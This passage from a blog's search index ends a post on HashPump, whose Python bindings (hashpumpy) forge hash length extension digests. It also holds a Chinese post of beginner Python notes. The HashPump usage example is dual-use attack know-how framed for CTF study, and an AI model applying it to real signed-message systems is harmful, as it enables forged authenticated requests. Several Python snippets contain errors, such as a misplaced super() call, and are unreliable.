rel="noopener">http://achatz.me/plaid-ctf-mt-pox/</a></li><li><a href="http://herkules.oulu.fi/thesis/nbnfioulu-201401141005.pdf" target="_blank" rel="noopener">http://herkules.oulu.fi/thesis/nbnfioulu-201401141005.pdf</a></li><li><a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/mtpox" target="_blank" rel="noopener">https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/mtpox</a></li></ul><h2 id="Python-Bindings"><a href="#Python-Bindings" class="headerlink" title="Python Bindings"></a>Python Bindings</h2><p>Fellow Python lovers will be pleased with this addition.  Saving me from writing an implementation of all these hash algorithms with the ability to modify states in Python, Python bindings have been added in the form of hashpumpy.  This addition comes from <a href="https://github.com/zachriggle" target="_blank" rel="noopener">zachriggle</a>.</p><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>These Python bindings are available on <a href="https://pypi.python.org/pypi/hashpumpy/1.0" target="_blank" rel="noopener">PyPI</a> and can be installed via pip.<br>  pip install hashpumpy</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><pre><code>&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump)Help on built-in function hashpump in module hashpumpy:hashpump(...)    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&gt;&gt;&gt; hashpumpy.hashpump(&apos;ffffffff&apos;, &apos;original_data&apos;, &apos;data_to_add&apos;, len(&apos;KEYKEYKEY&apos;))(&apos;e3c4a05f&apos;, &apos;original_datadata_to_add&apos;)</code></pre><h3 id="Python-3-note"><a href="#Python-3-note" class="headerlink" title="Python 3 note"></a>Python 3 note</h3><p>hashpumpy supports Python 3. Different from the Python 2 version, the second value (the new message) in the returned tuple from <code>hashpumpy.hashpump</code> is a bytes-like object instead of a string.</p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HashPump </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python</title>
      <link href="/2018/08-15-python.html"/>
      <url>/2018/08-15-python.html</url>
      <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="python编码"><a href="#python编码" class="headerlink" title="python编码"></a>python编码</h2><p>Python2中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。解决方法为只要在文件开头加入<br>Python3.X 源码文件默认使用utf-8编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*- 或者 #coding=utf-8</span><br><span class="line">注意：#coding=utf-8 的 = 号两边不要空格。</span><br></pre></td></tr></table></figure><h2 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a>print函数</h2><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"姓名:%s,年龄：%d"</span>%(name,age))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">%c 字符</span></span><br><span class="line"><span class="string">%s 字符串</span></span><br><span class="line"><span class="string">%i 有符号十进制整数</span></span><br><span class="line"><span class="string">%d 有符号十进制整数</span></span><br><span class="line"><span class="string">%u 无符号十进制整数</span></span><br><span class="line"><span class="string">%o 八进制</span></span><br><span class="line"><span class="string">%x，%X 十六进制</span></span><br><span class="line"><span class="string">%e，%E 索引符号</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="format方法"><a href="#format方法" class="headerlink" title="format方法"></a>format方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'&#123;1&#125;,&#123;0&#125;,&#123;1&#125;'</span>.format(<span class="string">'TaoXiao'</span>,<span class="number">18</span>))  <span class="comment"># 通过位置传递，相当方便，可以重复，可以换位置。</span></span><br><span class="line">print(<span class="string">'&#123;name&#125;: &#123;age&#125;'</span>.format(age=<span class="number">24</span>,name=<span class="string">'TaoXiao'</span>))   <span class="comment"># 通过关键字传递。</span></span><br><span class="line">a = (<span class="string">'baidu'</span>, <span class="string">'com'</span>)</span><br><span class="line">print(<span class="string">"&#123;0[0]&#125;.&#123;0[1]&#125;"</span>.format(a))<span class="comment">#传递元组索引传递</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">18,TaoXiao,18</span></span><br><span class="line"><span class="string">TaoXiao: 24</span></span><br><span class="line"><span class="string">baidu.com</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">算术部分</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">** 返回x的y次幂</span></span><br><span class="line"><span class="string">// 向下取接近除数的整数，如9//2=4,-9//2是-5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+=</span></span><br><span class="line"><span class="string">-=</span></span><br><span class="line"><span class="string">*=</span></span><br><span class="line"><span class="string">/=</span></span><br><span class="line"><span class="string">%=</span></span><br><span class="line"><span class="string">**=</span></span><br><span class="line"><span class="string">//=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">逻辑运算符</span></span><br><span class="line"><span class="string">and</span></span><br><span class="line"><span class="string">or </span></span><br><span class="line"><span class="string">not 非</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">成员运算符</span></span><br><span class="line"><span class="string">in</span></span><br><span class="line"><span class="string">not in</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="字符串分割方法和结尾"><a href="#字符串分割方法和结尾" class="headerlink" title="字符串分割方法和结尾"></a>字符串分割方法和结尾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"www"</span>,<span class="string">"baidu"</span>,<span class="string">"com"</span>,sep=<span class="string">"."</span>)</span><br><span class="line">print(<span class="string">"hello"</span>,end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h2 id="字符串常用函数"><a href="#字符串常用函数" class="headerlink" title="字符串常用函数"></a>字符串常用函数</h2><ul><li><code>.title()</code>首字母大写</li><li><code>.upper()</code>`lower()`大写\小写</li><li><code>.rstrip()</code>删除末尾的空格，<code>.lstrip()</code>开头的，<code>.strip()</code>两端的</li><li><code>str()</code>数字转字符串，或者<code>.__str__()</code></li></ul><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>索引值以0开始，-1为末尾的开始位置</p><p>可以用+进行拼接，*表示重复</p><ul><li><p>列表切片[::]。A[m:n]，即从m到n，不包括n，即A[0:3]为A[0,1,2]，左闭右开</p></li><li><p>[增]<code>.append()</code>末尾加</p></li><li><p>[增]<code>.insert(0,a)</code>在0位置加</p></li><li><p>[增]<code>.extend(list2)</code>列表追加</p></li><li><p>[删]<code>del a[0]</code>删除第0位元素</p></li><li><p>[删]<code>.pop()</code>弹出最后的元素</p></li><li><p>[删]<code>.remove()</code>参数可为具体元素</p></li><li><p>[排]<code>.sort(reverse=True)</code>排序，永久的</p></li><li><p>[排]<code>sorted()</code>排序函数，暂时的</p></li><li><p>[排]<code>.reverse()</code>翻转</p></li><li><p>[查]<code>in</code>,<code>not in</code></p></li></ul><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p><code>.items()</code>字典的一个记录</p><p><code>.keys()</code>字典的键值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> zidian.items():</span><br><span class="line">    print(<span class="string">"\nkey: "</span>+key)</span><br></pre></td></tr></table></figure><h2 id="列表、集合和字典推导式"><a href="#列表、集合和字典推导式" class="headerlink" title="列表、集合和字典推导式"></a>列表、集合和字典推导式</h2><p>它允许用户方便的从一个集合过滤元素，形成列表，在传递参数的过程中还可以修改元素。形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[expr <span class="keyword">for</span> val <span class="keyword">in</span> collection <span class="keyword">if</span> condition]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> collection:</span><br><span class="line">    <span class="keyword">if</span> condition:</span><br><span class="line">        result.append(expr)</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="传入任意参数"><a href="#传入任意参数" class="headerlink" title="传入任意参数"></a>传入任意参数</h3><p>一个星号是一个个的输入，接收是元组。俩个是一对对，如字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">没有星号，函数把你传入的参数列表（元组，字符串）当作一个参数来处理。</span><br><span class="line">有星号时，函数把你传入的参数列表（元组，字符串）当作多个参数来处理，在函数内生成元组（）</span><br><span class="line">如最后一个调用q2(t3)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def q2(*args):</span></span><br><span class="line"><span class="string">    print('例2')</span></span><br><span class="line"><span class="string">    print(args)</span></span><br><span class="line"><span class="string">    print(type(args))</span></span><br><span class="line"><span class="string">    print(args[0])</span></span><br><span class="line"><span class="string">t1 = 123,234,345</span></span><br><span class="line"><span class="string">q2(*t1)</span></span><br><span class="line"><span class="string">t2 = (234,345,456)</span></span><br><span class="line"><span class="string">q2(*t2)</span></span><br><span class="line"><span class="string">t3=[345,456,567]</span></span><br><span class="line"><span class="string">q2(*t3)</span></span><br><span class="line"><span class="string">q2(t3)</span></span><br><span class="line"><span class="string">print('-----------------')</span></span><br></pre></td></tr></table></figure><h3 id="匿名（lambda）函数"><a href="#匿名（lambda）函数" class="headerlink" title="匿名（lambda）函数"></a>匿名（lambda）函数</h3><h2 id="导入模块（import-）"><a href="#导入模块（import-）" class="headerlink" title="导入模块（import ）"></a>导入模块（import ）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 模块 <span class="comment">#导入整个模块</span></span><br><span class="line"><span class="keyword">from</span> 文件 <span class="keyword">import</span> 函数<span class="number">1</span>，函数<span class="number">2</span> <span class="comment">#从某个模块中导入多个函数</span></span><br><span class="line"><span class="comment"># 然后直接使用函数名就行</span></span><br><span class="line"><span class="keyword">from</span> 模块 <span class="keyword">import</span> * <span class="comment">#将某个模块全部函数导入</span></span><br></pre></td></tr></table></figure><p>导入模块，用<code>.</code>引用类</p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lei</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#调用父类属性</span></span><br><span class="line">    super().__init__(make)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,age)</span>:</span></span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hanshu</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"jh"</span>)</span><br></pre></td></tr></table></figure><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="逐行读取"><a href="#逐行读取" class="headerlink" title="逐行读取"></a>逐行读取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(<span class="string">'song.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) as f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure><h3 id="json文件"><a href="#json文件" class="headerlink" title="json文件"></a>json文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"w"</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers,f_obj)</span><br><span class="line">    <span class="comment">#n=json.load(f_obj)加载</span></span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">import json</span></span><br><span class="line"><span class="string">path = 'datasets/bitly_usagov/example.txt'</span></span><br><span class="line"><span class="string">records = [json.loads(line) for line in open(path)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 代码逻辑,只要其中任意一行报错都会被捕捉</span></span><br><span class="line">    i = int(<span class="string">'aaa'</span>)</span><br><span class="line">    print(i)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:  <span class="comment"># 如果出错执行</span></span><br><span class="line"><span class="comment"># except IOError as e:具体的错误</span></span><br><span class="line">    <span class="comment"># 捕捉错误</span></span><br><span class="line">    print(e)  <span class="comment"># invalid literal for int() with base 10: 'aaa'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'no Error'</span>)  <span class="comment"># 当没有错误的时候才执行</span></span><br><span class="line"><span class="keyword">finally</span>:  <span class="comment"># 不管出不出错一定会执行</span></span><br><span class="line">    print(<span class="string">'over'</span>)</span><br></pre></td></tr></table></figure><p>主动触发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'自首'</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)  <span class="comment"># 自首</span></span><br></pre></td></tr></table></figure><p>自定义主动触发错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, msg)</span>:</span></span><br><span class="line">        self.message = msg</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> MyError(<span class="string">'我错了'</span>)</span><br><span class="line"><span class="keyword">except</span> MyError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)  <span class="comment"># 我错了</span></span><br></pre></td></tr></table></figure><h3 id="assert-断言"><a href="#assert-断言" class="headerlink" title="assert 断言"></a>assert 断言</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="number">123</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="number">1</span> == <span class="number">1</span>  <span class="comment"># assert 条件，满足就执行下去，不满足报错</span></span><br><span class="line">print(<span class="number">456</span>)</span><br><span class="line">print(<span class="number">123</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">False</span>  <span class="comment"># AssertionError</span></span><br><span class="line">print(<span class="number">456</span>)</span><br></pre></td></tr></table></figure><h1 id="python进阶"><a href="#python进阶" class="headerlink" title="python进阶"></a>python进阶</h1><h2 id="collections"><a href="#collections" class="headerlink" title="collections"></a>collections</h2><h3 id="defaultdict"><a href="#defaultdict" class="headerlink" title="defaultdict"></a>defaultdict</h3><p><code>defaultdict</code>：defaultdict的作用是在于，当字典里的key不存在但被查找时，返回的不是keyError而是一个默认值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">dict1 = defaultdict(int)</span><br><span class="line">dict2 = defaultdict(set)</span><br><span class="line">dict3 = defaultdict(str)</span><br><span class="line">dict4 = defaultdict(list)</span><br><span class="line">dict1[<span class="number">2</span>] =<span class="string">'two'</span></span><br><span class="line"></span><br><span class="line">print(dict1[<span class="number">1</span>])</span><br><span class="line">print(dict2[<span class="number">1</span>])</span><br><span class="line">print(dict3[<span class="number">1</span>])</span><br><span class="line">print(dict4[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">set()</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line"><span class="comment"># 用法示例</span></span><br><span class="line">str_check = [(<span class="string">"换行（\\n）"</span>, <span class="string">"\n"</span>),(<span class="string">"逗号"</span>,<span class="string">","</span>)]</span><br><span class="line">key_check=collections.defaultdict(list)</span><br><span class="line"><span class="keyword">for</span> (key, value) <span class="keyword">in</span> str_check:</span><br><span class="line">    key_check.setdefault(key,value)</span><br><span class="line">    print(key_check)</span><br></pre></td></tr></table></figure><h3 id="Counter"><a href="#Counter" class="headerlink" title="Counter"></a>Counter</h3><p><code>Counter</code> 是实现的 <code>dict</code> 的一个子类，可以用来方便地计数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># elements() 按照counter的计数，重复返回元素</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(a=<span class="number">4</span>, b=<span class="number">2</span>, c=<span class="number">0</span>, d=<span class="number">-2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(c.elements())</span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># most_common(n) 按照counter的计数，按照降序，返回前n项组成的list; n忽略时返回全部</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(<span class="string">'abracadabra'</span>).most_common(<span class="number">3</span>)</span><br><span class="line">[(<span class="string">'a'</span>, <span class="number">5</span>), (<span class="string">'r'</span>, <span class="number">2</span>), (<span class="string">'b'</span>, <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># subtract([iterable-or-mapping]) counter按照相应的元素，计数相减</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(a=<span class="number">4</span>, b=<span class="number">2</span>, c=<span class="number">0</span>, d=<span class="number">-2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = Counter(a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>, d=<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.subtract(d)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">Counter(&#123;<span class="string">'a'</span>: <span class="number">3</span>, <span class="string">'b'</span>: <span class="number">0</span>, <span class="string">'c'</span>: <span class="number">-3</span>, <span class="string">'d'</span>: <span class="number">-6</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update([iterable-or-mapping]) 不同于字典的update方法，这里更新counter时，相同的key的value值相加而不是覆盖</span></span><br><span class="line"><span class="comment"># 实例化 Counter 时， 实际也是调用这个方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Counter 间的数学集合操作</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(a=<span class="number">3</span>, b=<span class="number">1</span>, c=<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = Counter(a=<span class="number">1</span>, b=<span class="number">2</span>, d=<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c + d                       <span class="comment"># counter相加, 相同的key的value相加</span></span><br><span class="line">Counter(&#123;<span class="string">'c'</span>: <span class="number">5</span>, <span class="string">'a'</span>: <span class="number">4</span>, <span class="string">'d'</span>: <span class="number">4</span>, <span class="string">'b'</span>: <span class="number">3</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c - d                       <span class="comment"># counter相减, 相同的key的value相减，只保留正值得value</span></span><br><span class="line">Counter(&#123;<span class="string">'c'</span>: <span class="number">5</span>, <span class="string">'a'</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c &amp; d                       <span class="comment"># 交集:  取两者都有的key,value取小的那一个</span></span><br><span class="line">Counter(&#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">1</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c | d                       <span class="comment"># 并集:  汇聚所有的key, key相同的情况下，取大的value</span></span><br><span class="line">Counter(&#123;<span class="string">'c'</span>: <span class="number">5</span>, <span class="string">'d'</span>: <span class="number">4</span>, <span class="string">'a'</span>: <span class="number">3</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">常见做法:</span><br><span class="line">sum(c.values())                 <span class="comment"># 继承自字典的.values()方法返回values的列表，再求和</span></span><br><span class="line">c.clear()                       <span class="comment"># 继承自字典的.clear()方法，清空counter</span></span><br><span class="line">list(c)                         <span class="comment"># 返回key组成的list</span></span><br><span class="line">set(c)                          <span class="comment"># 返回key组成的set</span></span><br><span class="line">dict(c)                         <span class="comment"># 转化成字典</span></span><br><span class="line">c.items()                       <span class="comment"># 转化成(元素，计数值)组成的列表</span></span><br><span class="line">Counter(dict(list_of_pairs))    <span class="comment"># 从(元素，计数值)组成的列表转化成Counter</span></span><br><span class="line">c.most_common()[:-n<span class="number">-1</span>:<span class="number">-1</span>]       <span class="comment"># 最小n个计数的(元素，计数值)组成的列表</span></span><br><span class="line">c += Counter()                  <span class="comment"># 利用counter的相加来去除负值和0的值</span></span><br></pre></td></tr></table></figure><h2 id="sorted"><a href="#sorted" class="headerlink" title="sorted"></a><code>sorted</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted(iterable, cmp=<span class="keyword">None</span>, key=<span class="keyword">None</span>, reverse=<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure><ul><li>iterable – 可迭代对象。</li><li>cmp – 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。</li><li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li><li>reverse – 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。</li></ul><h1 id="anaconda相关"><a href="#anaconda相关" class="headerlink" title="anaconda相关"></a>anaconda相关</h1><h2 id="python环境配置和切换"><a href="#python环境配置和切换" class="headerlink" title="python环境配置和切换"></a>python环境配置和切换</h2><h3 id="基于-python2-7-创建一个名为py2-7-的环境"><a href="#基于-python2-7-创建一个名为py2-7-的环境" class="headerlink" title="基于 python2.7 创建一个名为py2.7 的环境"></a>基于 python2.7 创建一个名为py2.7 的环境</h3><p>conda create –name test_py2 python=2.7</p><h3 id="激活-python2-7-环境"><a href="#激活-python2-7-环境" class="headerlink" title="激活 python2.7 环境"></a>激活 python2.7 环境</h3><p>activate py2.7 # windows<br>source activate py2.7 # linux/mac</p><h1 id="string库（包含了数字和字母集）"><a href="#string库（包含了数字和字母集）" class="headerlink" title="string库（包含了数字和字母集）"></a>string库（包含了数字和字母集）</h1><blockquote><p>digit是数字<br>lowercase 小写字母<br>#常用操作</p></blockquote><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>coding=utf-8</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="去除列表中空字符串最快最简单的方法"><a href="#去除列表中空字符串最快最简单的方法" class="headerlink" title="去除列表中空字符串最快最简单的方法"></a>去除列表中空字符串最快最简单的方法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filter(None, your_list)</span><br><span class="line"><span class="keyword">while</span> <span class="string">''</span> <span class="keyword">in</span> your_list:</span><br><span class="line">    your_list.remove(<span class="string">''</span>)</span><br><span class="line">和</span><br><span class="line">your_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> your_list <span class="keyword">if</span> x != <span class="string">''</span>]</span><br></pre></td></tr></table></figure><h2 id="字符数字之间的转换函数"><a href="#字符数字之间的转换函数" class="headerlink" title="字符数字之间的转换函数"></a>字符数字之间的转换函数</h2><figure class="highlight bash"><table><tr><td 